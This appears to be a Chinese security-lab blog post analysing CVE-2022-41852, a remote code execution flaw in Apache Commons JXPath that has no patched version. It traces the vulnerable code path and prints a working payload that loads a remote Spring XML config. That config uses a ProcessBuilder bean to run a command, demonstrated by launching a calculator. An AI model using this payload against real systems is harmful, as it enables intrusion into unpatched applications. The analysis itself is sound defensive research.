---
title: 【技术干货】CVE-2022-41852 Apache Commons Jxpath命令执行漏洞分析
url: https://mp.weixin.qq.com/s?__biz=Mzg5NjEyMjA5OQ==&mid=2247496153&idx=1&sn=c7b6380da70f19597139eccbc3d5ece4&chksm=c0075c45f770d5531554ded20d88f4fb281938d1d64c9766ef97c53de7483945cab03c773fa7&scene=58&subscene=0#rd
source: 星阑科技
date: 2022-10-25
fetch_date: 2025-10-03T20:50:55.099101
---

# 【技术干货】CVE-2022-41852 Apache Commons Jxpath命令执行漏洞分析

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/Cc8QqLUKOeiaTdQ1Kt2AIiakgiaTyLAKbBnp0eEEAUrNmiaIyNsIs4AJl8WoFpb6CTFt4CJmy9ftUibaFq0xqlSjwfw/0?wx_fmt=jpeg)

# 【技术干货】CVE-2022-41852 Apache Commons Jxpath命令执行漏洞分析

星阑科技

以下文章来源于星阑实验室
，作者PortalLab

![](http://wx.qlogo.cn/mmhead/Q3auHgzwzM7I2gqBRVgAVpkPNqBsibrgE0DM5mTmZIRYzgFUNPjF59g/0)

**星阑实验室**
.

聚焦API安全最新资讯，分享API安全研究成果

![](https://mmbiz.qpic.cn/mmbiz_gif/Cc8QqLUKOeiaFHTFtiatmEIxZQcXOHfyr6GOBM88IeMm28ybjSAHEJKicuQxPxN5L5NFZ5mza2NOnuokf9ant2fUQ/640?wx_fmt=gif)

![](https://mmbiz.qpic.cn/mmbiz_png/wfFYMXc5G1NSkNgX8voWSJmuSUlcQtsLKWSxBUmsxRCOqbNibhhXFuhtfXiak5ibYGMcEGD9yzzIy4qVq1Q5a63IQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![](https://mmbiz.qpic.cn/mmbiz_png/wfFYMXc5G1NSkNgX8voWSJmuSUlcQtsLgZE9TXJrsxHuabVS0UbocSyplzJJ0pxtQQZpAzIBdZwlByjZ3qUUAQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "好看的图.png")

**xxhzz**

**@PortalLab实验室**

**项目介绍**

Apache Commons JXPath是美国阿帕奇（Apache）基金会的一种 XPath 1.0 的基于 Java 的实现。JXPath 为使用 XPath 语法遍历 JavaBeans、DOM 和其他类型的对象的图形提供了 API。

**漏洞描述**

Apache Commons JXPath 存在安全漏洞，攻击者可以利用除compile()和compilePath()函数之外的所有处理XPath字符串的JXPathContext类函数通过XPath表达式从类路径加载任何Java类，从而执行恶意代码。

![](https://mmbiz.qpic.cn/mmbiz_png/wfFYMXc5G1MdSSDbEvQkNoibGiaO36k8u9m6UklxEXL4neZukzWqeDfYJcyMuT1LOceyx8MwHwHmzf0JxlT3xib7g/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

**利用范围**

Apache Commons JXpath <= 1.3

**漏洞分析**

## **环境搭建**

使用github上POC进行分析复现https://github.com/Warxim/CVE-2022-41852

![](https://mmbiz.qpic.cn/mmbiz_png/wfFYMXc5G1MdSSDbEvQkNoibGiaO36k8u9g3oicusTbkYEibMMUekvbb0SK8sRdAPcGEoicu6ibZKOOGblgodI7AuCFQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

漏洞POC使用Spring框架，简单实现接受用户输入并使用它从Person类中检索指定的数据。

## **前置知识**

在漏洞分析之前，首先了解一下JXPath及用法（参考官网用户指南：https://commons.apache.org/proper/commons-jxpath/users-guide.html）

![](https://mmbiz.qpic.cn/mmbiz_png/wfFYMXc5G1MdSSDbEvQkNoibGiaO36k8u9ws1veLqxuudQ1HjCJ6CVYnk6LadQuaT97DeUE2oCt5dM8zNBAo7VBQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

JXPath除了能够像XPatth一样能够访问XML文档各种元素之外，还能够读取和写入JavaBean的属性，获取和设置数组、集合、映射、透明容器、Servlet 中的各种上下文对象等元素。

JXPath 支持开箱即用的标准 XPath 函数。它还支持“标准”扩展函数（基本上是通往 Java 的桥梁），以及完全自定义的扩展函数。

![](https://mmbiz.qpic.cn/mmbiz_png/wfFYMXc5G1MdSSDbEvQkNoibGiaO36k8u9GiaUFNYIVepM75E7JHxB4Gvbqw7a9L8Pef5fXJwibE4s0lJAcP5CUJeQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

## **代码分析**

JXPath支持自定义扩展函数，首先看一下PackageFunctions这个类

![](https://mmbiz.qpic.cn/mmbiz_png/wfFYMXc5G1MdSSDbEvQkNoibGiaO36k8u9X4KJzdFFYObyyR5ibicw0mtZ8UPutB9bKs6I8wJZqVwUxYKP3hboYvwQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

在org.apache.commons.jxpath.PackageFunctions#getFunction中，存在methodName.equals("new"）

![](https://mmbiz.qpic.cn/mmbiz_png/wfFYMXc5G1MdSSDbEvQkNoibGiaO36k8u9VBaTjNnCovK2ianRQf3Xvsx8LsnpDG8mgHYOmM1TWE60sW0Uufc7yag/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

这里实例化的xpath表达式设置为了xxx.new()，截取括号前作为方法名，如果调用new方法就被视为实例化，两个判断一个是实例化构造函数，另一个是静态方法。

往下分析，如果是实例化构造函数，在Spring框架中可通过加载远程配置实现命令执行，这里使用org.springframework.context.support.ClassPathXmlApplicationContext类，构造payload：

org.springframework.context.support.ClassPathXmlApplicationContext.new("http://127.0.0.1:8001/test.xml")

恶意的xml文件使用Spring-bean，设置init-method实现RCE

```
"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">        <constructor-arg>            <list>                <value>cmd</value>                <value>/c</value>                <value><![CDATA[calc]]></value>            </list>        </constructor-arg>    </bean></beans>
```

在实例化之后，继续跟进会来到org.apache.commons.jxpath.ri.compiler.ExtensionFunction#computeValue

![](https://mmbiz.qpic.cn/mmbiz_png/wfFYMXc5G1MdSSDbEvQkNoibGiaO36k8u9WguQdmDTweJ33pTyd3bKJV2wTsSK3TZ9xojyNQLfNicNPxmoITBLYUg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

在获得了org.apache.commons.jxpath.Function对应的这个实例后，会调⽤具体的invoke实现。

![](https://mmbiz.qpic.cn/mmbiz_png/wfFYMXc5G1MdSSDbEvQkNoibGiaO36k8u91OO3r2BzI0lIDKtO4YoUy3ialIOsAJAC2y2QxeMAVRUYnetTAtLdQxg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![](https://mmbiz.qpic.cn/mmbiz_png/wfFYMXc5G1MdSSDbEvQkNoibGiaO36k8u9qW5N2TibUcYK4ib4MHCXUwEyv6rrlDnFkKd8YmjkGZXxhw4NgflmKT2Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

最后在调用invoke实现Spring-bean加载，执行恶意代码。

![](https://mmbiz.qpic.cn/mmbiz_png/wfFYMXc5G1MdSSDbEvQkNoibGiaO36k8u9EdxUOt4icKNsmp16iarm4Cia3kkjGpia6ugLzAEhGZGF2TWM7hcFRzht2g/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

Spring框架中还可以用org.apache.commons.jxpath.functions.MethodFunction这个类。

除了实例化构造函数，Spring框架加载恶意配置的利用之外。还能利用静态方法进行RCE，例如jndi、jdbc等，后续笔者也会进行补充和分析。

当然在官方介绍中说明，除了构造函数和使用静态方法，还介绍了一种调用。

![](https://mmbiz.qpic.cn/mmbiz_png/wfFYMXc5G1MdSSDbEvQkNoibGiaO36k8u9NAE79u3XvaOd7SD2DaiaXkiblTGg1Yph3m7hOXcibXdxxCWQoIXibYaKzg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

此调用也可以直接利用getValue解析表达式。

## **漏洞复现**

在Spring中利用远程加载配置来命令执行。

构造test.xml

![](https://mmbiz.qpic.cn/mmbiz_png/wfFYMXc5G1MdSSDbEvQkNoibGiaO36k8u9kOlAZ5vKMkHM32Pk1ibaGWlTp4qibCjWRIbBobDujs6xeQwGcohf6bZw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

本地用python开启http服务，模拟远程加载。

![](https://mmbiz.qpic.cn/mmbiz_png/wfFYMXc5G1MdSSDbEvQkNoibGiaO36k8u9qSbq060CN0vvIuYIZWnLMKTOxbxNlIve5cmYGt7Qw3ytszU4ZtY1zA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

成功命令执行。

![](https://mmbiz.qpic.cn/mmbiz_png/wfFYMXc5G1MdSSDbEvQkNoibGiaO36k8u9k0RibjExDibl8y8RECgXZZDjZKMo5m7Fn2AdHcV3qXyozUQoia6IFWe7A/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

**修复建议**

目前官方已经停止更新，无修复版本。

**参考材料**

1.https://github.com/Warxim/CVE-2022-41852

2.https://commons.apache.org/proper/commons-jxpath/users-guide.html

3.https://github.com/advisories/GHSA-wrx5-rp7m-mm49

**更多技术干货，欢迎关注“星阑实验室”公众号**

**关于Portal Lab**

星阑科技 Portal Lab 致力于前沿安全技术研究及能力工具化。主要研究方向为API 安全、应用安全、攻防对抗等领域。实验室成员研究成果曾发表于BlackHat、HITB、BlueHat、KCon、XCon等国内外知名安全会议，并多次发布开源安全工具。未来，Portal Lab将继续以开放创新的态度积极投入各类安全技术研究，持续为安全社区及企业级客户提供高质量技术输出。

**往期 · 推荐**

[![](https://mmbiz.qpic.cn/mmbiz_jpg/Cc8QqLUKOegoGL5ScibX9RqY6PqMAtnoZfER1hSGkj87C4oXR4PqW7CM8tiavmQur8O7WZQyZgVLn1wKwHsibcvEg/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)](http://mp.weixin.qq.com/s?__biz=Mzg5NjEyMjA5OQ==&mid=2247492888&idx=1&sn=219ad26c37836f5cdefc5f41dea620c0&chksm=c0074884f770c192f60f651f3e0c6a0f293b38a59d9499a89cd1b9c2e2d8cbc4dd4620783ed1&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/Cc8QqLUKOegoGL5ScibX9RqY6PqMAtnoZQtEDMUM2CZ3jqhq9cO3DtWcP2KgvjlDJia2Arlsw9IrGfWPEO7RYl3w/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)](http://mp.weixin.qq.com/s?__biz=Mzg5NjEyMjA5OQ==&mid=2247492771&idx=1&sn=5bc86cbf62a83db69b1b1919ad86273b&chksm=c007493ff770c0290f199daef6b03bd09f9f85e35c5179c3ca8fe062623ecc27522b45850f0a&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/Cc8QqLUKOegoGL5ScibX9RqY6PqMAtnoZ1qIhLiasDXUrUT4RWJ7zFYmTMVWz1ww66AqdvxjF9ynLOR7139xQib7Q/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)](http://mp.weixin.qq.com/s?__biz=Mzg5NjEyMjA5OQ==&mid=2247492691&idx=1&sn=7f4fdf863953280d024c2ae7144badff&chksm=c00749cff770c0d98d9848f5415e2c7b395add84d39e4ab51172549c024d36cfc80af23ad43e&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/Cc8QqLUKOegoGL5ScibX9RqY6PqMAtnoZRibR6e5iawhrSuV4TM3ib9AssGQNZ9SPQGCic3G3M9PgpLt5GafnkEiaPmw/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)](http://mp.weixin.qq.com/s?__biz=Mzg5NjEyMjA5OQ==&mid=2247492617&idx=1&sn=103b4a185c02f1435ddcc1778bd038e6&chksm=c0074995f770c08374efe7cda4e53a8991a867e2b1b73fe05f0f4a32335756a56c77483ee75f&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/mmbiz_gif/Cc8QqLUKOehwcHoxicoOah5mxDjLHMZ9RHUxNeibERphRXOj3AEupxt7JyOt3LF1RmmWQibYmicTv2DxM93iaEJhLxw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1)

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/Cc8QqLUKOegqicSqJoUd8bSLhdEYnZt3HwOB3tQXas2d1T2xlXc1K1hVMIl1qLxY6qwm5kFbJ6YURBkoXUtPoiaA/0?wx_fmt=png)

星阑科技

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/Cc8QqLUKOegqicSqJoUd8bSLhdEYnZt3HwOB3tQXas2d1T2xlXc1K1hVMIl1qLxY6qwm5kFbJ6YURBkoXUtPoiaA/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，...